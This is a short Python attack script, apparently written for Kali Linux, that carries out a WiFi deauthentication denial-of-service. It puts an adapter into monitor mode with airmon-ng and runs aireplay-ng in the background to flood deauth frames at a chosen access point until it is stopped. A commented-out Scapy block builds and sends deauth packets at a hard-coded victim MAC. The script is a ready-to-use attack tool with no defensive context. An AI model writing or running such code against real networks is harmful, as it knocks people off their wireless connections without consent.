


# We will be using the subprocess module to run commands on Kali Linux.
import subprocess
from scapy.all import *

# hackchannel hackbssid -data we need from the active_wireless_networks
#hackbssid = active_wireless_networks[int(choice)]["BSSID"]
#hackchannel = active_wireless_networks[int(choice)]["channel"].strip()
def deautentication_user( hacknic , hackbssid ,hackchannel):

    # Change to the channel we want to perform the DOS attack on.
    # Monitoring takes place on a different channel and we need to set it to that channel.
    # airmon-ng->To enable monitor mode
    subprocess.run(["airmon-ng", "start", hacknic + "mon", hackchannel])

    # Deauthenticate clients. We run it with Popen and we send the output to subprocess.DEVNULL and the errors to subprocess.DEVNULL. We will thus run deauthenticate in the background.
    subprocess.Popen(["aireplay-ng", "--deauth", "0", "-a", hackbssid, hacknic + "mon"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    # We run an infinite loop which you can quit by presses ctrl-c. The deauthentication will stop when we stop the script.
    try:
        while True:
            print("Deauthenticating clients, press ctrl-c to stop")
    except KeyboardInterrupt:
        print("Stop monitoring mode")
        # We run a subprocess.run command where we stop monitoring mode on the network adapter.
        subprocess.run(["airmon-ng", "stop", hacknic + "mon"])
        print("Thank you! Exiting now")

# #victim
# target_mac = "00:ae:fa:81:e2:5e"
# #network to deautenticate from
# gateway_mac = "e8:94:f6:c4:97:3f"
# # 802.11 frame
# # addr1: destination MAC
# # addr2: source MAC
# # addr3: Access Point MAC
# dot11 = Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac)
# # stack them up
# packet = RadioTap()/dot11/Dot11Deauth(reason=7)
# # send the packet
# sendp(packet, inter=0.1, count=100, iface="wlan0mon", verbose=1)
